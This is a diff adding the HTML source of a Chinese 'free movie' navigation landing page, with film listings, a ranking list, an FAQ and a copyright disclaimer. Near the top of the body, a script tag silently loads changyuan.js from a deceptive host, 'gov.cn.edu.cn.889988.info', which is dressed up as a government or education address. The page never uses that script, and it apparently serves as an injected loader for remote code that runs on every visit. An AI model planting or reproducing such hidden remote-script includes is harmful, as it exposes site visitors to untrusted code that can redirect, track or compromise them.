@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费电影网 - 免费看电影/电视剧/动漫导航</title>
+<meta name="description" content="免费电影网整理最新免费电影、热播电视剧、动漫综艺与经典老片导航，按类型/地区/年份分类，帮影迷快速找到想看的影视内容。">
+<meta name="keywords" content="免费电影网,免费看电影,免费电视剧,免费动漫,电影导航,热播剧集,影视排行榜">
+<meta name="revisit-after" content="1 days">
+<link rel="canonical" href="https://mianfeidianyingwang-top.github.io">
+<meta property="og:title" content="免费电影网 - 免费影视导航">
+<meta property="og:description" content="最新免费电影、热播电视剧、动漫综艺一站式导航。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://mianfeidianyingwang-top.github.io">
+<style>
+:root{
+  --bg:#04110f;
+  --bg2:#07201c;
+  --neon:#22e3a5;
+  --neon2:#19c2ff;
+  --ink:#eafff7;
+  --muted:#8fae9f;
+  --card:#0a2620;
+  --line:rgba(34,227,165,.18);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--ink);line-height:1.65}
+a{color:inherit;text-decoration:none}
+
+/* 导航 */
+.nav{position:fixed;inset:0 0 auto 0;z-index:99;display:flex;align-items:center;justify-content:space-between;padding:14px 20px;background:rgba(4,17,15,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.logo{font-weight:800;font-size:20px}
+.logo b{color:var(--neon)}
+.nav ul{display:flex;gap:4px;list-style:none}
+.nav ul a{padding:8px 12px;border-radius:8px;color:var(--muted);font-size:14px}
+.nav ul a:hover,.nav ul a.active{color:#04110f;background:var(--neon)}
+.menu{display:none;font-size:24px;color:var(--neon);cursor:pointer}
+
+/* 首屏 */
+.hero{margin-top:58px;padding:96px 20px 72px;text-align:center;background:radial-gradient(1000px 380px at 50% -20%,rgba(25,194,255,.25),transparent),linear-gradient(180deg,#06201b,#04110f)}
+.hero h1{font-size:44px;line-height:1.25}
+.hero h1 span{background:linear-gradient(90deg,var(--neon),var(--neon2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--muted);max-width:640px;margin:16px auto 26px}
+.search{display:flex;gap:10px;max-width:540px;margin:0 auto}
+.search input{flex:1;padding:13px 16px;border-radius:10px;border:1px solid var(--line);background:#03140f;color:#fff;outline:none}
+.search button{padding:13px 22px;border:0;border-radius:10px;font-weight:700;color:#04110f;background:linear-gradient(90deg,var(--neon),var(--neon2));cursor:pointer}
+.stats{display:flex;gap:26px;justify-content:center;margin-top:34px;flex-wrap:wrap}
+.stats b{display:block;font-size:24px;color:var(--neon)}
+.stats span{font-size:13px;color:var(--muted)}
+
+/* 区块 */
+.section{max-width:1140px;margin:0 auto;padding:64px 20px}
+.sec-title{font-size:28px;margin-bottom:6px}
+.sec-sub{color:var(--muted);margin-bottom:28px}
+.grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fill,minmax(210px,1fr))}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s transform,.25s box-shadow}
+.card:hover{transform:translateY(-6px);box-shadow:0 14px 30px rgba(34,227,165,.14)}
+.poster{height:260px;display:flex;align-items:center;justify-content:center;font-size:46px;background:linear-gradient(135deg,#0c332b,#06252f)}
+.card .body{padding:14px}
+.card h3{font-size:16px;margin-bottom:6px}
+.meta{display:flex;justify-content:space-between;color:var(--muted);font-size:13px}
+.tag{display:inline-block;font-size:12px;padding:2px 8px;border-radius:999px;margin-right:6px}
+.t-free{background:rgba(34,227,165,.16);color:var(--neon)}
+.t-hot{background:rgba(25,194,255,.18);color:var(--neon2)}
+
+/* 分类 */
+.cats{display:grid;gap:14px;grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}
+.cat{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px;text-align:center;transition:.2s}
+.cat:hover{background:rgba(34,227,165,.12);border-color:var(--neon)}
+.cat .ico{font-size:30px}
+.cat h4{margin-top:8px;font-size:15px}
+
+/* 排行 */
+.rank{max-width:820px;margin:0 auto}
+.row{display:flex;align-items:center;gap:14px;padding:14px 16px;background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:10px}
+.no{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;background:#0c332b;color:var(--muted)}
+.no.top{background:linear-gradient(135deg,var(--neon),var(--neon2));color:#04110f}
+.row h4{font-size:15px}
+.row p{font-size:13px;color:var(--muted)}
+.score{margin-left:auto;font-weight:800;color:var(--neon)}
+
+/* 关于+FAQ */
+.box{background:var(--bg2);border:1px solid var(--line);border-radius:16px;padding:28px}
+.box h3{color:var(--neon);margin:18px 0 10px}
+.box p,.box li{color:#c7e7da}
+.faq{border:1px solid var(--line);border-radius:10px;margin-bottom:10px;background:var(--card)}
+.faq q{display:block;padding:16px 18px;font-weight:600;cursor:pointer}
+.faq .ans{max-height:0;overflow:hidden;padding:0 18px;color:var(--muted);transition:.3s}
+.faq.open .ans{padding:0 18px 16px;max-height:240px}
+
+/* 页脚 */
+.footer{border-top:1px solid var(--line);padding:40px 20px;text-align:center;color:var(--muted)}
+.footer a{color:var(--muted);margin:0 8px}
+.footer .url{color:var(--neon);margin:14px 0}
+.disclaim{max-width:760px;margin:14px auto 0;font-size:13px;line-height:1.8;opacity:.75}
+
+.top-btn{position:fixed;right:18px;bottom:18px;width:44px;height:44px;border:0;border-radius:50%;background:linear-gradient(135deg,var(--neon),var(--neon2));color:#04110f;font-size:20px;font-weight:800;cursor:pointer;display:none;z-index:98}
+
+@media(max-width:768px){
+  .nav ul{display:none;position:absolute;top:58px;left:0;right:0;flex-direction:column;background:#04110f;border-bottom:1px solid var(--line);padding:8px 0}
+  .nav ul.show{display:flex}
+  .menu{display:block}
+  .hero h1{font-size:30px}
+  .search{flex-direction:column}
+  .search button{width:100%}
+  .section{padding:48px 16px}
+  .poster{height:200px;font-size:36px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nav">
+  <div class="logo">免费<b>电影网</b></div>
+  <nav>
+    <ul id="menu">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#movies">免费电影</a></li>
+      <li><a href="#tv">热播剧集</a></li>
+      <li><a href="#cats">影视分类</a></li>
+      <li><a href="#rank">排行榜</a></li>
+      <li><a href="#about">关于我们</a></li>
+      <li><a href="#faq">常见问题</a></li>
+    </ul>
+  </nav>
+  <div class="menu" id="menuBtn">☰</div>
+</header>
+
+<section class="hero" id="home">
+  <h1>免费电影网 · <span>不花钱也能看好片</span></h1>
+  <p>免费电影网帮你整理可免费浏览的影视信息：最新电影、热播电视剧、动漫综艺、经典老片，按类型一键找片。</p>
+  <div class="search">
+    <input type="text" placeholder="搜索 免费电影 / 电视剧 / 动漫 / 演员">
+    <button type="button">搜索</button>
+  </div>
+  <div class="stats">
+    <div><b>15000+</b><span>影视条目</span></div>
+    <div><b>0 元</b><span>浏览片单</span></div>
+    <div><b>每日更新</b><span>新片热剧</span></div>
+    <div><b>12 类</b><span>影视频道</span></div>
+  </div>
+</section>
+
+<section class="section" id="movies">
+  <h2 class="sec-title">免费电影</h2>
+  <p class="sec-sub">免费电影网每日收录院线新片、网络电影与经典老片信息</p>
+  <div class="grid">
+    <div class="card"><div class="poster">🎬</div><div class="body"><h3>午夜放映厅</h3><div class="meta"><span class="tag t-free">免费</span><span>2026</span></div></div></div>
+    <div class="card"><div class="poster">🚀</div><div class="body"><h3>轨道尽头</h3><div class="meta"><span class="tag t-hot">热门</span><span>科幻</span></div></div></div>
+    <div class="card"><div class="poster">🕵️</div><div class="body"><h3>旧城谜案</h3><div class="meta"><span class="tag t-free">免费</span><span>悬疑</span></div></div></div>
+    <div class="card"><div class="poster">💞</div><div class="body"><h3>晚风来信</h3><div class="meta"><span>爱情</span><span>2025</span></div></div></div>
+    <div class="card"><div class="poster">🐉</div><div class="body"><h3>山海拾遗</h3><div class="meta"><span class="tag t-hot">热门</span><span>奇幻</span></div></div></div>
+    <div class="card"><div class="poster">🎭</div><div class="body"><h3>戏班往事</h3><div class="meta"><span>剧情</span><span>经典</span></div></div></div>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:#03140f">
+  <h2 class="sec-title">热播剧集</h2>
+  <p class="sec-sub">国产剧、欧美剧、网剧、迷你剧持续更新</p>
+  <div class="grid">
+    <div class="card"><div class="poster">📺</div><div class="body"><h3>霓虹长街</h3><div class="meta"><span class="tag t-hot">更新至 30 集</span><span>国产</span></div></div></div>
+    <div class="card"><div class="poster">🗡️</div><div class="body"><h3>江湖未晚</h3><div class="meta"><span class="tag t-free">免费</span><span>武侠</span></div></div></div>
+    <div class="card"><div class="poster">🏙️</div><div class="body"><h3>凌晨四点半</h3><div class="meta"><span>都市</span><span>网剧</span></div></div></div>
+    <div class="card"><div class="poster">🧬</div><div class="body"><h3>边界协议</h3><div class="meta"><span class="tag t-hot">更新至 9 集</span><span>欧美</span></div></div></div>
+  </div>
+</section>
+
+<section class="section" id="cats">
+  <h2 class="sec-title">影视分类</h2>
+  <p class="sec-sub">免费电影网按类型、地区、年份快速分好</p>
+  <div class="cats">
+    <a class="cat" href="#"><div class="ico">🎬</div><h4>电影</h4></a>
+    <a class="cat" href="#"><div class="ico">📺</div><h4>电视剧</h4></a>
+    <a class="cat" href="#"><div class="ico">🎤</div><h4>综艺</h4></a>
+    <a class="cat" href="#"><div class="ico">🎨</div><h4>动漫</h4></a>
+    <a class="cat" href="#"><div class="ico">🇨🇳</div><h4>国产</h4></a>
+    <a class="cat" href="#"><div class="ico">🌏</div><h4>欧美</h4></a>
+    <a class="cat" href="#"><div class="ico">🇯🇵</div><h4>日韩</h4></a>
+    <a class="cat" href="#"><div class="ico">📅</div><h4>按年份</h4></a>
+  </div>
+</section>
+
+<section class="section" id="rank" style="background:#03140f">
+  <h2 class="sec-title">免费电影网 · 今日热播榜</h2>
+  <p class="sec-sub">按热度、口碑与更新节奏排序</p>
+  <div class="rank">
+    <div class="row"><div class="no top">1</div><div><h4>午夜放映厅</h4><p>电影 / 剧情 / 2026</p></div><div class="score">9.3</div></div>
+    <div class="row"><div class="no top">2</div><div><h4>霓虹长街</h4><p>电视剧 / 国产 / 热播</p></div><div class="score">9.1</div></div>
+    <div class="row"><div class="no top">3</div><div><h4>轨道尽头</h4><p>电影 / 科幻 / 热门</p></div><div class="score">9.0</div></div>
+    <div class="row"><div class="no">4</div><div><h4>旧城谜案</h4><p>电影 / 悬疑 / 免费</p></div><div class="score">8.8</div></div>
+    <div class="row"><div class="no">5</div><div><h4>江湖未晚</h4><p>电视剧 / 武侠 / 更新中</p></div><div class="score">8.7</div></div>
+    <div class="row"><div class="no">6</div><div><h4>山海拾遗</h4><p>电影 / 奇幻 / 热门</p></div><div class="score">8.6</div></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <h2 class="sec-title">关于免费电影网</h2>
+  <div class="box">
+    <h3>免费电影网做什么</h3>
+    <p>免费电影网是一个影视信息与片单导航站，聚合最新电影、热播电视剧、动漫综艺和经典老片信息，让用户在免费浏览的前提下快速决定“今晚看什么”。</p>
+    <h3>站点特点</h3>
+    <p>
+      ✅ 片单免费浏览，不强制注册<br>
+      ✅ 按类型 / 地区 / 年份分类<br>
+      ✅ 新片、热剧、排行榜每日维护<br>
+      ✅ 偏导航与发现，不误导“虚假播放”
+    </p>
+    <h3>内容原则</h3>
+    <p>免费电影网只做影视信息整理与分类导航，不存储、不分发侵权资源；如涉及版权问题，会按合规要求处理。</p>
+  </div>
+</section>
+
+<section class="section" id="faq" style="background:#03140f">
+  <h2 class="sec-title">常见问题</h2>
+  <p class="sec-sub">关于免费电影网的高频问题</p>
+  <div class="box">
+    <div class="faq"><q>免费电影网真的免费吗？</q><div class="ans">片单与影视信息浏览免费，具体播放以正版或合规平台为准。</div></div>
+    <div class="faq"><q>为什么叫免费电影网？</q><div class="ans">因为站点定位是“免费发现电影/剧集”，降低用户找片成本。</div></div>
+    <div class="faq"><q>每天都会更新吗？</q><div class="ans">新片、热播剧与排行榜按日维护，经典片单按周补充。</div></div>
+    <div class="faq"><q>可以直接在线播吗？</q><div class="ans">本站以导航为主，不直接提供违规播放源；合规片源会标明平台。</div></div>
+    <div class="faq"><q>片单里的评分怎么来？</q><div class="ans">评分为站内整理展示，用于排序参考，不代表单一平台官方成绩。</div></div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div>
+    <a href="#home">首页</a>
+    <a href="#movies">免费电影</a>
+    <a href="#tv">热播剧集</a>
+    <a href="#cats">分类</a>
+    <a href="#rank">排行榜</a>
+    <a href="#about">关于</a>
+  </div>
+  <div class="url">https://mianfeidianyingwang-top.github.io</div>
+  <div class="disclaim">
+    免责声明：免费电影网为影视信息导航与片单整理平台，不存储、不分发影视资源文件。
+    站内内容来自公开影视信息，若涉及版权问题，请联系我们处理。
+  </div>
+  <div style="margin-top:14px">© 2026 免费电影网</div>
+</footer>
+
+<button class="top-btn" id="topBtn">↑</button>
+
+<script>
+document.getElementById('menuBtn').onclick=function(){
+  document.getElementById('menu').classList.toggle('show');
+};
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(){
+    var id=this.getAttribute('href').slice(1);
+    if(id){var el=document.getElementById(id);if(el)el.scrollIntoView({behavior:'smooth'});}
+    document.getElementById('menu').classList.remove('show');
+  });
+});
+window.addEventListener('scroll',function(){
+  var secs=document.querySelectorAll('.hero,.section');
+  var links=document.querySelectorAll('.nav ul a');
+  var y=window.scrollY+120;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop && y<s.offsetTop+s.offsetHeight){
+      links.forEach(function(l){l.classList.remove('active')});
+      var a=document.querySelector('.nav ul a[href="#'+s.id+'"]');
+      if(a)a.classList.add('active');
+    }
+  });
+  document.getElementById('topBtn').style.display = window.scrollY>400 ? 'block':'none';
+});
+document.getElementById('topBtn').onclick=function(){window.scrollTo({top:0,behavior:'smooth'});};
+document.querySelectorAll('.faq q').forEach(function(q){
+  q.addEventListener('click',function(){q.parentElement.classList.toggle('open');});
+});
+</script>
+</body>
+</html>
